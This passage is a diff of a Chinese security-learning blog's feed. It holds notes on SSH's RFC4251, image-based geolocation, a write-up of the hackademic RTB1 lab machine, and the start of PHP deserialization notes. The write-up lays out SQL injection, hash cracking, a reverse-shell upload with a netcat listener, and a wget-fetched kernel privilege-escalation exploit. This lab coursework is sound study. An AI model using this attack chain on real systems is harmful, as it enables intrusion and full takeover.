-<li>没有CA的那个信任模型到底是怎么工作的</li>
-</ol>
-</li>
-<li>如何自定义算法或认证方式</li>
-<li>什么是IANA<ol>
-<li>其职责或目的是什么</li>
-<li>其产出了什么文档、项目或(其他知识载体)？</li>
-</ol>
-</li>
-<li>什么是IETF<ol>
-<li>其职责或目的是什么</li>
-<li>什么是RFC，我能从中获得什么？</li>
-<li>除了RFC还有什么其他文档或(其他知识载体)？</li>
-</ol>
-</li>
-<li>关于传输层协议<ol>
-<li>如何构建加密session对话的？</li>
-<li>如何确认服务端身份的？</li>
-<li>安全风险在哪里</li>
-<li>算法协商的流程？</li>
-</ol>
-</li>
-<li>关于身份认证协议<ol>
-<li>三种认证方式各自的原理和<em>具体</em>工作流程是什么</li>
-<li>各自的漏洞是什么</li>
-<li>认证协商的流程？</li>
-</ol>
-</li>
-<li>关于连接协议<ol>
-<li>什么是多路复用，具体技术细节和原理是什么？</li>
-</ol>
-</li>
-<li>如何猜解伪随机数<ol>
-<li>当前常用的生成看似随机的伪随机数的算法有哪些？</li>
-</ol>
-</li>
-<li>什么是Convert Channals？</li>
-<li>Diffie-Hellman key exchange原理是什么？</li>
-<li>什么是端口转发和X11转发</li>
-<li>最终问题：从传输层协议到连接协议，一套完整的工作流程是什么<ol>
-<li>常见的ssh工具有哪些</li>
-<li>如何使用这些工具</li>
-<li>wireshark使用技巧有哪些</li>
-<li>如何进行网络编程，用python模拟ssh工作流程</li>
-</ol>
-</li>
-</ol>
-<h1 id="下一跳"><a href="#下一跳" class="headerlink" title="下一跳"></a>下一跳</h1><h2 id="进一步了解ssh"><a href="#进一步了解ssh" class="headerlink" title="进一步了解ssh"></a>进一步了解ssh</h2><p>[SSH-TRANS]——RFC4253<br>[SSH-USERAUTH]——RFC4252<br>[SSH-CONNECT]——RFC4254<br>[SSH-NUMBERS]——RFC4250</p>
-<h2 id="进一步了解IETF、IANA和RFC"><a href="#进一步了解IETF、IANA和RFC" class="headerlink" title="进一步了解IETF、IANA和RFC"></a>进一步了解IETF、IANA和RFC</h2><p>[RFC2119]<br>[RFC2434]</p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 🌟 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>RFC4251阅后总结</title>
+      <link href="/2023/11/11/old/RFC4251%E9%98%85%E5%90%8E%E6%80%BB%E7%BB%93/"/>
+      <url>/2023/11/11/old/RFC4251%E9%98%85%E5%90%8E%E6%80%BB%E7%BB%93/</url>
+      
+        <content type="html"><![CDATA[<p>ps: 线索里的tab键都被吞了，正在处理中</p><hr><h1 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h1><p>来源 <a href="https://datatracker.ietf.org/">https://datatracker.ietf.org</a></p><ul><li>IETF Internet Engineering Task Force</li><li>RFC Request for Comment</li></ul><h1 id="线索"><a href="#线索" class="headerlink" title="线索"></a>线索</h1><span id="more"></span><ul><li><p>设计架构</p><ul><li><p>主机key</p><ul><li>两个信任模型<ul><li>有CA</li><li>无CA</li></ul></li></ul></li><li><p>可拓展性</p><ul><li>方法标识符<ul><li>算法</li><li>认证方式</li></ul></li></ul></li><li><p>策略问题</p><ul><li>加密</li><li>完整性</li><li>压缩</li><li>密钥交换</li><li>公钥算法和格式</li><li>身份认证方式</li><li>The operations that the user is allowed to perform using the<br>connection protocol</li></ul></li><li><p>安全特性<br>- 协商 negotiation</p></li><li><p>本地化和字符集问题</p></li><li><p>数据类型</p><ul><li>比特 byte</li><li>布尔 boolean</li><li>32位无符号整型 uint32</li><li>64位无符号整型 uint64</li><li>字符串 string</li><li>多精度整型 mpint</li><li>列表 name-list</li></ul></li><li><p>算法和方式命名 algorithm and method naming</p><ul><li>implementation自带了一些算法和方式，但是可以自己加</li></ul></li></ul></li><li><p>消息数字标识 Number Message</p><ul><li>传输层协议</li><li>身份认证协议</li><li>连接层协议</li><li>反弹客户端协议 Reversed for client protocol</li><li>本地拓展</li></ul></li><li><p>IANA因素 IANA Consideration </p><ul><li>Internet Assigned Numbers Authority<ul><li><a href="https://www.iana.org/">https://www.iana.org/</a></li><li>The global coordination of the DNS Root, IP addressing, and other Internet protocol resources is performed as the Internet Assigned Numbers Authority (IANA) functions.</li><li>在协议中，其职能是分配协议的名称或专业术语(?)、注册协议(?)</li></ul></li><li>RFC4250——IANA专业术语定义文档</li></ul></li><li><p>协议层次</p><ul><li>传输层协议<ul><li>对服务端的身份认证</li><li>session id (给上层协议使用)</li></ul></li><li>身份认证协议<ul><li>密码认证</li><li>密钥认证</li><li>基于主机的认证</li></ul></li><li>连接协议<ul><li>多路复用</li></ul></li></ul></li><li><p>安全考虑</p><ul><li>伪随机数生成</li><li>控制字符过滤</li><li>传输<ul><li>保密性</li><li>完整性</li><li>replay——确保数据在不同会话间的隔离，防止replay先前会话的数据</li><li>中间人攻击——三种情形</li><li>DOS Denial of Service</li><li>Convert Channals 转换频道？</li><li>前向加密 forward secrecy FS  或完美前向加密 perfect forward secrecy PFS <ul><li>确保即使私钥被泄漏或破解，过去的通信数据依旧不能被解密。一般方法是在非对称加密之前，用仅在通信会话期间有效，并且不会存储在长期存储介质中的临时密钥来加密</li><li>Diffie-Hellman key exchange</li><li>compromise</li></ul></li><li>密钥交换方式提供<ul><li>好像不是安全考虑</li></ul></li><li>流量分析</li></ul></li><li>身份认证<ul><li>弱传输</li><li>调试信息 debug message<ul><li>可能暴露主机信息</li></ul></li><li>公钥认证<ul><li>前提：客户端是没有被渗透，私钥没有被拿到</li><li>需要密码来加密私钥</li><li>smartcards</li></ul></li><li>密码认证<ul><li>前提：服务器是真的</li><li>不然会暴露用户名和密码</li></ul></li><li>基于主机的认证<ul><li>前提：客户端没有被渗透</li></ul></li></ul></li><li>连接<ul><li>端点安全？End Point Security<ul><li>如果服务端被入侵了，终端会话、端口转发、系统访问都被入侵</li><li>如果客户端被入侵了，并且攻击者没被身份认证协议组织，其暴露的服务都容易收到攻击</li></ul></li><li>端口转发？</li><li>X11转发？</li></ul></li></ul></li></ul><p>奇怪的单词<br>    - compromise google翻译上的英语释义是妥协，但是文档中的意思好像是妥协(?)</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>阐述了ssh的设计理念、总体架构和安全考虑，以及延伸了某些技术细节，介绍了更进一步学习的路径</p><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><ol><li>什么是CA<ol><li>CA认证的工作原理是什么</li><li>没有CA的那个信任模型到底是怎么工作的</li></ol></li><li>如何自定义算法或认证方式</li><li>什么是IANA<ol><li>其职责或目的是什么</li><li>其产出了什么文档、项目或(其他知识载体)？</li></ol></li><li>什么是IETF<ol><li>其职责或目的是什么</li><li>什么是RFC，我能从中获得什么？</li><li>除了RFC还有什么其他文档或(其他知识载体)？</li></ol></li><li>关于传输层协议<ol><li>如何构建加密session对话的？</li><li>如何确认服务端身份的？</li><li>安全风险在哪里</li><li>算法协商的流程？</li></ol></li><li>关于身份认证协议<ol><li>三种认证方式各自的原理和<em>具体</em>工作流程是什么</li><li>各自的漏洞是什么</li><li>认证协商的流程？</li></ol></li><li>关于连接协议<ol><li>什么是多路复用，具体技术细节和原理是什么？</li></ol></li><li>如何猜解伪随机数<ol><li>当前常用的生成看似随机的伪随机数的算法有哪些？</li></ol></li><li>什么是Convert Channals？</li><li>Diffie-Hellman key exchange原理是什么？</li><li>什么是端口转发和X11转发</li><li>最终问题：从传输层协议到连接协议，一套完整的工作流程是什么<ol><li>常见的ssh工具有哪些</li><li>如何使用这些工具</li><li>wireshark使用技巧有哪些</li><li>如何进行网络编程，用python模拟ssh工作流程</li></ol></li></ol><h1 id="下一跳"><a href="#下一跳" class="headerlink" title="下一跳"></a>下一跳</h1><h2 id="进一步了解ssh"><a href="#进一步了解ssh" class="headerlink" title="进一步了解ssh"></a>进一步了解ssh</h2><p>[SSH-TRANS]——RFC4253<br>[SSH-USERAUTH]——RFC4252<br>[SSH-CONNECT]——RFC4254<br>[SSH-NUMBERS]——RFC4250</p><h2 id="进一步了解IETF、IANA和RFC"><a href="#进一步了解IETF、IANA和RFC" class="headerlink" title="进一步了解IETF、IANA和RFC"></a>进一步了解IETF、IANA和RFC</h2><p>[RFC2119]<br>[RFC2434]</p>]]></content>
+      
+      
       <categories>
-        <category>网络安全</category>
-        <category>网络协议</category>
+          
+          <category> 网络安全 </category>
+          
+          <category> 网络协议 </category>
+          
       </categories>
-      <tags>
-        <tag>🌟🌟🌟</tag>
-        <tag>阅后总结</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>看图识地点</title>
-    <url>/2023/11/05/old/%E7%9C%8B%E5%9B%BE%E8%AF%86%E5%9C%B0%E7%82%B9/</url>
-    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>这是一个极度简单普通的技术，但其揭示并隐含着通向一条知识的大道<br>这篇文章本身也是极度简陋的，会时不时更新</p>
-<h1 id="训练处"><a href="#训练处" class="headerlink" title="训练处"></a>训练处</h1><p>(暂时不知道有什么比赛)</p>
-<ol>
-<li><a href="https://ctf.show/">https://ctf.show</a> 其中的网络迷踪里的题目很多很有趣，尽管csdn近乎毁了其中的乐趣，不过技术还是值得学习的</li>
-<li><a href="https://www.geoguessr.com/">https://www.geoguessr.com</a> 根据某地的360度图猜地点的游戏</li>
-</ol>
-<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p>百度识图<br>搜狗识图<br>google识图 lens.google.com<br>yandox识图 yandox.com&#x2F;images</p>
-<h1 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h1><p>得到一张图片，通常要获得该图片所在地址，难一点就是拍摄时间</p>
-<ol>
-<li>识图工具找到图片来源或者以图搜图的找线索</li>
-<li>找的到或找不到，这都是有可能的</li>
-</ol>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 🌟🌟🌟 </tag>
+            
+            <tag> 阅后总结 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>看图识地点</title>
+      <link href="/2023/11/05/old/%E7%9C%8B%E5%9B%BE%E8%AF%86%E5%9C%B0%E7%82%B9/"/>
+      <url>/2023/11/05/old/%E7%9C%8B%E5%9B%BE%E8%AF%86%E5%9C%B0%E7%82%B9/</url>
+      
+        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>这是一个极度简单普通的技术，但其揭示并隐含着通向一条知识的大道<br>这篇文章本身也是极度简陋的，会时不时更新</p><h1 id="训练处"><a href="#训练处" class="headerlink" title="训练处"></a>训练处</h1><p>(暂时不知道有什么比赛)</p><ol><li><a href="https://ctf.show/">https://ctf.show</a> 其中的网络迷踪里的题目很多很有趣，尽管csdn近乎毁了其中的乐趣，不过技术还是值得学习的</li><li><a href="https://www.geoguessr.com/">https://www.geoguessr.com</a> 根据某地的360度图猜地点的游戏</li></ol><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p>百度识图<br>搜狗识图<br>google识图 lens.google.com<br>yandox识图 yandox.com&#x2F;images</p><h1 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h1><p>得到一张图片，通常要获得该图片所在地址，难一点就是拍摄时间</p><ol><li>识图工具找到图片来源或者以图搜图的找线索</li><li>找的到或找不到，这都是有可能的</li></ol>]]></content>
+      
+      
       <categories>
-        <category>网络安全</category>
-        <category>社会工程学</category>
+          
+          <category> 网络安全 </category>
+          
+          <category> 社会工程学 </category>
+          
       </categories>
-      <tags>
-        <tag>🌟</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>hackademic_RTB1_writeup</title>
-    <url>/2023/10/25/old/hackademic-RTB1-writeup/</url>
-    <content><![CDATA[<h1 id="hackademic-RTB1-靶机名-writeup"><a href="#hackademic-RTB1-靶机名-writeup" class="headerlink" title="hackademic RTB1_靶机名_writeup"></a>hackademic RTB1_靶机名_writeup</h1><p>这是学校课程的作业，《红队&#x2F;渗透 — 和我一起来打靶》也涉及了该靶机</p>
-<span id="more"></span>
-<h1 id="靶机简介"><a href="#靶机简介" class="headerlink" title="靶机简介"></a>靶机简介</h1><blockquote>
-<p>靶机名：hackademic RTB1<br>靶机链接：<a href="https://www.vulnhub.com/entry/hackademic-rtb1,17/">https://www.vulnhub.com/entry/hackademic-rtb1,17/</a><br>描述：This is the first realistic hackademic challenge (root this box) by mr.pr0n<br>    Download the target and get root.<br>    After all, try to read the contents of the file ‘key.txt’ in the root directory.<br>    Enjoy!</p>
-</blockquote>
-<h1 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h1><p>ps:具体攻击过程请看<strong>渗透过程及结果</strong></p>
-<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><ol>
-<li>nmap扫描端口发现80端口开放，访问自动跳转目录Hackerademic_RTB1</li>
-<li>dirsearch目录遍历，发现文件夹wp-admin，进入后台登陆页面</li>
-<li>访问网页首页，依次点击直到点击<code>Uncategoried</code>，发现参数cat，是有sql注入漏洞的</li>
-</ol>
-<h2 id="拿shell"><a href="#拿shell" class="headerlink" title="拿shell"></a>拿shell</h2><ol>
-<li>sqlmap注入后，查看wordpress数据库下的wp_users，获取网站用户和密码的hash值，通过sqlmap的自带功能爆破hash值获得密码</li>
-<li>GerogeMiller用户的权限较大，登陆后的网页东西更多，可以更改网站设置选项，其中有<code>是否开启upload</code>的选项，也可以设定上传文件的允许格式，这里添加php</li>
-<li>上传kali自带的php反弹shell脚本，目录为<code>/usr/share/webshells/php/php-reverse-shell.php</code>，修改脚本的ip和端口参数为渗透机</li>
-<li>本地nc开启端口监听；网站上传完文件后会提示上传到了哪个目录，直接访问，和本地nc的监听端口连接，getshell</li>
-</ol>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ol>
-<li><code>sudo -l</code>发现当前的用户不是sudoer</li>
-<li>寻找suid可执行文件，也没有找到能用的</li>
-<li><code>uname -a</code>查看当前靶机内核版本，<code>2.6.31.5-127.fc12.1686</code></li>
-<li><code>searchsploit 2.6.3|grep &quot;Local Pri&quot;</code>寻找内核漏洞提取脚本，cp到<code>/var/www/html</code></li>
-<li>渗透机开启apache服务，在拿到的shell上用<code>wget</code>下载内核漏洞脚本，并用靶机的gcc命令编译执行</li>
-<li>15285.c这个脚本可以root靶机 <code>Linux Kernel 2.6.36-rc8 - &#39;RDS Protocal&#39; Local Privilege Escalation</code></li>
-</ol>
-<h1 id="工具和技术"><a href="#工具和技术" class="headerlink" title="工具和技术"></a>工具和技术</h1><blockquote>
-<p>nmap<br>dirsearch<br>sqlmap<br>kali自带的反弹shell脚本和提取脚本<br>nc监听端口<br>通过渗透机的apache网站下载脚本至靶机<br><code>searchsploit</code><br>内核提取漏洞</p>
-</blockquote>
-<h1 id="渗透过程及结果"><a href="#渗透过程及结果" class="headerlink" title="渗透过程及结果"></a>渗透过程及结果</h1><ol>
-<li>信息搜集<br><img src="/2023/10/25/old/hackademic-RTB1-writeup/1.png"><br><img src="/2023/10/25/old/hackademic-RTB1-writeup/2.png"><br><img src="/2023/10/25/old/hackademic-RTB1-writeup/3.png"><br><img src="/2023/10/25/old/hackademic-RTB1-writeup/4.png"></li>
-<li>sqlmap注入<br><img src="/2023/10/25/old/hackademic-RTB1-writeup/5.png"><br><img src="/2023/10/25/old/hackademic-RTB1-writeup/6.png"><br><img src="/2023/10/25/old/hackademic-RTB1-writeup/7.png"><br><img src="/2023/10/25/old/hackademic-RTB1-writeup/8.png"><br><img src="/2023/10/25/old/hackademic-RTB1-writeup/9.png"></li>
-<li>上传webshell<br><img src="/2023/10/25/old/hackademic-RTB1-writeup/10.png"><br><img src="/2023/10/25/old/hackademic-RTB1-writeup/11.png"><br><img src="/2023/10/25/old/hackademic-RTB1-writeup/12.png"><br><img src="/2023/10/25/old/hackademic-RTB1-writeup/13.png"><br><img src="/2023/10/25/old/hackademic-RTB1-writeup/14.png"><br><img src="/2023/10/25/old/hackademic-RTB1-writeup/15.png"><br><img src="/2023/10/25/old/hackademic-RTB1-writeup/16.png"></li>
-<li>getshell和普通的信息搜集<br><img src="/2023/10/25/old/hackademic-RTB1-writeup/17.png"></li>
-<li>内核漏洞测试，root靶机<br><img src="/2023/10/25/old/hackademic-RTB1-writeup/18.png"><br><img src="/2023/10/25/old/hackademic-RTB1-writeup/19.png"><br><img src="/2023/10/25/old/hackademic-RTB1-writeup/20.png"><br><img src="/2023/10/25/old/hackademic-RTB1-writeup/21.png"></li>
-</ol>
-<h1 id="总结反思"><a href="#总结反思" class="headerlink" title="总结反思"></a>总结反思</h1><blockquote>
-<p>首先，sqlmap确实是很好用的工具，尤其对我这种手注基础薄弱的人来说更是如此，这是我的短板<br>kali的自带脚本十分的有用，我应该多多了解一下的<br>内核漏洞是十分基础和重要的漏洞利用方式，但是根据系统内核版本模糊地查询漏洞脚本一个一个试——太累了、太慢了、太粗糙了，摸索或学习一套快速方便的工作流因此而言是十分重要的<br>关于内核漏洞的原理，这东西可钻研的东西可多了，但如果真的要学习这个东西：需要扎实的计算机构成原理、系统运行方式基础，这些东西我根本没有</p>
-</blockquote>
-<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
-<p>学校给的writeup</p>
-</blockquote>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 🌟 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>hackademic_RTB1_writeup</title>
+      <link href="/2023/10/25/old/hackademic-RTB1-writeup/"/>
+      <url>/2023/10/25/old/hackademic-RTB1-writeup/</url>
+      
+        <content type="html"><![CDATA[<h1 id="hackademic-RTB1-靶机名-writeup"><a href="#hackademic-RTB1-靶机名-writeup" class="headerlink" title="hackademic RTB1_靶机名_writeup"></a>hackademic RTB1_靶机名_writeup</h1><p>这是学校课程的作业，《红队&#x2F;渗透 — 和我一起来打靶》也涉及了该靶机</p><span id="more"></span><h1 id="靶机简介"><a href="#靶机简介" class="headerlink" title="靶机简介"></a>靶机简介</h1><blockquote><p>靶机名：hackademic RTB1<br>靶机链接：<a href="https://www.vulnhub.com/entry/hackademic-rtb1,17/">https://www.vulnhub.com/entry/hackademic-rtb1,17/</a><br>描述：This is the first realistic hackademic challenge (root this box) by mr.pr0n<br>    Download the target and get root.<br>    After all, try to read the contents of the file ‘key.txt’ in the root directory.<br>    Enjoy!</p></blockquote><h1 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h1><p>ps:具体攻击过程请看<strong>渗透过程及结果</strong></p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><ol><li>nmap扫描端口发现80端口开放，访问自动跳转目录Hackerademic_RTB1</li><li>dirsearch目录遍历，发现文件夹wp-admin，进入后台登陆页面</li><li>访问网页首页，依次点击直到点击<code>Uncategoried</code>，发现参数cat，是有sql注入漏洞的</li></ol><h2 id="拿shell"><a href="#拿shell" class="headerlink" title="拿shell"></a>拿shell</h2><ol><li>sqlmap注入后，查看wordpress数据库下的wp_users，获取网站用户和密码的hash值，通过sqlmap的自带功能爆破hash值获得密码</li><li>GerogeMiller用户的权限较大，登陆后的网页东西更多，可以更改网站设置选项，其中有<code>是否开启upload</code>的选项，也可以设定上传文件的允许格式，这里添加php</li><li>上传kali自带的php反弹shell脚本，目录为<code>/usr/share/webshells/php/php-reverse-shell.php</code>，修改脚本的ip和端口参数为渗透机</li><li>本地nc开启端口监听；网站上传完文件后会提示上传到了哪个目录，直接访问，和本地nc的监听端口连接，getshell</li></ol><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ol><li><code>sudo -l</code>发现当前的用户不是sudoer</li><li>寻找suid可执行文件，也没有找到能用的</li><li><code>uname -a</code>查看当前靶机内核版本，<code>2.6.31.5-127.fc12.1686</code></li><li><code>searchsploit 2.6.3|grep &quot;Local Pri&quot;</code>寻找内核漏洞提取脚本，cp到<code>/var/www/html</code></li><li>渗透机开启apache服务，在拿到的shell上用<code>wget</code>下载内核漏洞脚本，并用靶机的gcc命令编译执行</li><li>15285.c这个脚本可以root靶机 <code>Linux Kernel 2.6.36-rc8 - &#39;RDS Protocal&#39; Local Privilege Escalation</code></li></ol><h1 id="工具和技术"><a href="#工具和技术" class="headerlink" title="工具和技术"></a>工具和技术</h1><blockquote><p>nmap<br>dirsearch<br>sqlmap<br>kali自带的反弹shell脚本和提取脚本<br>nc监听端口<br>通过渗透机的apache网站下载脚本至靶机<br><code>searchsploit</code><br>内核提取漏洞</p></blockquote><h1 id="渗透过程及结果"><a href="#渗透过程及结果" class="headerlink" title="渗透过程及结果"></a>渗透过程及结果</h1><ol><li>信息搜集<br><img src="/2023/10/25/old/hackademic-RTB1-writeup/1.png"><br><img src="/2023/10/25/old/hackademic-RTB1-writeup/2.png"><br><img src="/2023/10/25/old/hackademic-RTB1-writeup/3.png"><br><img src="/2023/10/25/old/hackademic-RTB1-writeup/4.png"></li><li>sqlmap注入<br><img src="/2023/10/25/old/hackademic-RTB1-writeup/5.png"><br><img src="/2023/10/25/old/hackademic-RTB1-writeup/6.png"><br><img src="/2023/10/25/old/hackademic-RTB1-writeup/7.png"><br><img src="/2023/10/25/old/hackademic-RTB1-writeup/8.png"><br><img src="/2023/10/25/old/hackademic-RTB1-writeup/9.png"></li><li>上传webshell<br><img src="/2023/10/25/old/hackademic-RTB1-writeup/10.png"><br><img src="/2023/10/25/old/hackademic-RTB1-writeup/11.png"><br><img src="/2023/10/25/old/hackademic-RTB1-writeup/12.png"><br><img src="/2023/10/25/old/hackademic-RTB1-writeup/13.png"><br><img src="/2023/10/25/old/hackademic-RTB1-writeup/14.png"><br><img src="/2023/10/25/old/hackademic-RTB1-writeup/15.png"><br><img src="/2023/10/25/old/hackademic-RTB1-writeup/16.png"></li><li>getshell和普通的信息搜集<br><img src="/2023/10/25/old/hackademic-RTB1-writeup/17.png"></li><li>内核漏洞测试，root靶机<br><img src="/2023/10/25/old/hackademic-RTB1-writeup/18.png"><br><img src="/2023/10/25/old/hackademic-RTB1-writeup/19.png"><br><img src="/2023/10/25/old/hackademic-RTB1-writeup/20.png"><br><img src="/2023/10/25/old/hackademic-RTB1-writeup/21.png"></li></ol><h1 id="总结反思"><a href="#总结反思" class="headerlink" title="总结反思"></a>总结反思</h1><blockquote><p>首先，sqlmap确实是很好用的工具，尤其对我这种手注基础薄弱的人来说更是如此，这是我的短板<br>kali的自带脚本十分的有用，我应该多多了解一下的<br>内核漏洞是十分基础和重要的漏洞利用方式，但是根据系统内核版本模糊地查询漏洞脚本一个一个试——太累了、太慢了、太粗糙了，摸索或学习一套快速方便的工作流因此而言是十分重要的<br>关于内核漏洞的原理，这东西可钻研的东西可多了，但如果真的要学习这个东西：需要扎实的计算机构成原理、系统运行方式基础，这些东西我根本没有</p></blockquote><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote><p>学校给的writeup</p></blockquote>]]></content>
+      
+      
       <categories>
-        <category>网络安全</category>
+          
+          <category> 网络安全 </category>
+          
       </categories>
-      <tags>
-        <tag>🌟</tag>
-        <tag>writeup</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php反序列化浅记</title>
-    <url>/2023/10/25/old/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E8%AE%B0/</url>
-    <content><![CDATA[<p>关键词：对象、类、成员变量、成员函数、父子类、序列化、反序列化、魔术方法、poc</p>
-<p>感谢让我领略了php反序列化风采的K3zy前辈： <a href="https://github.com/kkontheway">https://github.com/kkontheway</a></p>
-<hr>
-<span id="more"></span>
-
-<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>面向对象的是一种编程思想和方法<br>即将数据和操作数据的方法封装成一个对象，来实现具体的功能<br>也就是说对象包含了一些数据和一些函数(即方法)，可以调用对象的成员变量来进行计算，也可以调用对象的成员方法达成某一功能</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对象这个概念十分的抽象，runoob关于对象的介绍十分的好，但是我觉得有多余的抽象，如果要方便理解这个概念，还是具象一点好，尤其是我不搞开发，不向这种东西注入“心血”</span><br><span class="line">我认为要善于灵活地运用抽象和具象来方便学习</span><br></pre></td></tr></table></figure>
-
-<p>类是创建对象的模版，对象的创建按照类的结构、包含类的方法(函数)</p>
-<h2 id="类的创建"><a href="#类的创建" class="headerlink" title="类的创建"></a>类的创建</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class 类名 &#123;</span><br><span class="line">	成员变量</span><br><span class="line">	function 成员方法(形参)&#123;</span><br><span class="line">		方法语句; //函数语句</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="对象的创建"><a href="#对象的创建" class="headerlink" title="对象的创建"></a>对象的创建</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$变量 = new 类名(穿参);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="对象成员的调用"><a href="#对象成员的调用" class="headerlink" title="对象成员的调用"></a>对象成员的调用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$对象变量-&gt;成员变量 = 1;</span><br><span class="line">$对象变量-&gt;成员函数();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="关于对象的访问控制"><a href="#关于对象的访问控制" class="headerlink" title="关于对象的访问控制"></a>关于对象的访问控制</h2><p><strong>public（公有）：</strong> 公有的类成员可以在任何地方被访问。&#x2F;&#x2F; 如果用var定义那就算public<br><strong>protected（受保护）：</strong> 受保护的类成员则可以被其自身以及其子类和父类访问。<br><strong>private（私有）：</strong> 私有的类成员则只能被其定义所在的类访问。</p>
-<p>以上关于访问控制的“类”可以和”对象“替换</p>
-<h1 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h1><p>只需要知道两个函数和一个核心特性</p>
-<ul>
-<li><strong>serialize()</strong> 函数用于序列化对象或数组，并返回一个字符串，如果对象里有方法，则略过不管</li>
-<li><strong>unserialize()</strong> 函数用于将序列化后的对象或数组进行反序列化，并返回原始的对象结构(不包括方法了)</li>
-<li>核心特性就是，若一个序列化字符串包含了对象a(其结构与类A完全相同)，且发送到了一个php网页被反序列化，同时这个php网页定义了类A，那么这个反序列化后的对象能调用类A的方法了</li>
-</ul>
-<p>对象结构与类结构相同的意思是，对象具有相同的类名和变量名</p>
-<h1 id="浅析序列化字符串"><a href="#浅析序列化字符串" class="headerlink" title="浅析序列化字符串"></a>浅析序列化字符串</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Flag1&#123; </span><br><span class="line">    public $file;  </span><br><span class="line">	public $apple=&quot;red and sweet&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class Flag02&#123;</span><br><span class="line">	public $test;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new Flag1();</span><br><span class="line">$a-&gt;file=new Flag02();</span><br><span class="line">$a-&gt;file-&gt;test=&quot;I&#x27;m truthleader&quot;;</span><br><span class="line"></span><br><span class="line">echo serialize($a)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>该代码打印的序列化字符串如下：<br><code>O:5:&quot;Flag1&quot;:3:&#123;s:4:&quot;file&quot;;O:6:&quot;Flag02&quot;:1:&#123;s:4:&quot;test&quot;;s:15:&quot;I&#39;m truthleader&quot;;&#125;s:5:&quot;apple&quot;;s:13:&quot;red and sweet&quot;;s:6:&quot;banana&quot;;N;&#125;</code><br>这可以拆分为</p>
-<ul>
-<li>O:5:”Flag1”:2:{}</li>
-<li>:4:”file”;O:6:”Flag02”:1:{}s:5:”apple”;s:13:”red and sweet”;s:6:”banana”;N;</li>
-<li>s:4:”test”;s:15:”I’m truthleader”;</li>
-</ul>
-<ol>
-<li>第一段的O代表对象，5代表对象名的字符数，Flag1是对象名，2代表该对象有两个成员变量，{这里嵌套了两个成员变量}</li>
-<li>第二段的s代表字符串(即变量的数据类型)，file是变量名，而Flag02是值名兼对象名。banana的值的类型是N。{这里的成员变量是一键值对的形式排列的}</li>
-<li>第三段同上</li>
-</ol>
-<h1 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h1><p>具体内容看php官网<br><a href="https://www.php.net/manual/zh/language.oop5.magic.php">https://www.php.net/manual/zh/language.oop5.magic.php</a></p>
-<p>魔法方法是一种特殊的方法，当对对象执行某些操作时会覆盖 PHP 的默认操作。魔术方法与序列化和反序列化强相关<br>魔术方法的名称是固定的：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__wakeup() 执行unserialize()时，先会调用这个函数</span><br><span class="line"></span><br><span class="line">__sleep() 执行serialize()时，先会调用这个函数</span><br><span class="line"></span><br><span class="line">__destruct() 对象被销毁时触发</span><br><span class="line"></span><br><span class="line">__call() 在对象上下文中调用不可访问的方法时触发</span><br><span class="line"></span><br><span class="line">__callStatic() 在静态上下文中调用不可访问的方法时触发</span><br><span class="line"></span><br><span class="line">__get() 用于从不可访问的属性读取数据或者不存在这个键都会调用此方法</span><br><span class="line"></span><br><span class="line">__set() 用于将数据写入不可访问的属性</span><br><span class="line"></span><br><span class="line">__isset() 在不可访问的属性上调用isset()或empty()触发</span><br><span class="line"></span><br><span class="line">__unset() 